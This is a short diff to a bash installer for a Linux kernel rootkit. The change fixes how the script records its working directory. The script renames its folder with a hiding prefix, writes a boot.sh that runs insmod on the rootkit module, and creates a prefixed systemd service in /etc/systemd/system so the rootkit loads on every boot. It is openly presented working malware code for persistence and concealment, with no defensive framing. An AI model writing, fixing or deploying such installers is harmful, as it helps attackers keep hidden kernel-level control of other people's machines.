@@ -14,13 +14,14 @@ if test -f "$koFile"; then
     thisDirPath=$(pwd)
     thisDir=${PWD##*/}
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
+    thisDirPath=$(pwd)
 
     # Load rootkit on boot:
     touch boot.sh
     chmod +x boot.sh
     echo "#!/bin/bash" >> boot.sh
-    echo "insmod "pwd"/$koFile" >> boot.sh
-    bootPath=$(pwd)"/boot.sh"
+    echo "insmod $thisDirPath/$koFile" >> boot.sh
+    bootPath="$thisDirPath/boot.sh"
     loadServicePath="/etc/systemd/system/""$magicPrefix""load.service"
     touch $loadServicePath
     echo "[Unit]" >> "$loadServicePath"
